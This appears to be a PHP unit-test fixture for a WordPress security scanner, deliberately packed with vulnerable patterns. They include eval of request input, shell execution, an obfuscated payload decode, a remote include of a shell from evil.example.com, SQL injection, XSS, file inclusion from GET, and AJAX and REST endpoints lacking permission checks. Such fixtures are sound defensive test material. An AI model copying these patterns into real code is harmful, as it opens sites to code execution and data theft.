<?php
// Intentionally vulnerable code used by the unit tests. Never deploy.

eval( $_POST['code'] );
assert( $_GET['a'] );
$f = create_function( '$a', 'return $a;' );
echo preg_replace( '/x/e', 'strtoupper("$0")', $text );
shell_exec( 'ls' );
system( $cmd );
$payload = base64_decode( gzinflate( $blob ) );
include 'http://evil.example.com/shell.txt';
$data = unserialize( $_COOKIE['data'] );
extract( $_REQUEST );
error_reporting( 0 );
$out = `whoami`;
$fn = $_GET['fn'];
$fn( 'x' );

echo $_GET['name'];
echo 'Hello ' . $_REQUEST['user'];
include $_GET['page'] . '.php';
$wpdb->query( "DELETE FROM {$wpdb->posts} WHERE ID = " . $_POST['id'] );
file_get_contents( $_GET['file'] );

function kip_delete() {
	global $wpdb;
	$wpdb->query( "DELETE FROM wp_options WHERE option_name = '$name'" );
}

add_action( 'wp_ajax_kip_save', 'kip_ajax_save' );
function kip_ajax_save() {
	update_option( 'x', 1 );
	wp_die();
}

register_rest_route( 'kip/v1', '/open', array( 'methods' => 'GET', 'callback' => 'kip_cb' ) );
register_rest_route( 'kip/v1', '/public', array( 'methods' => 'GET', 'callback' => 'kip_cb', 'permission_callback' => '__return_true' ) );

$remote = file_get_contents( 'https://example.com/data.json' );
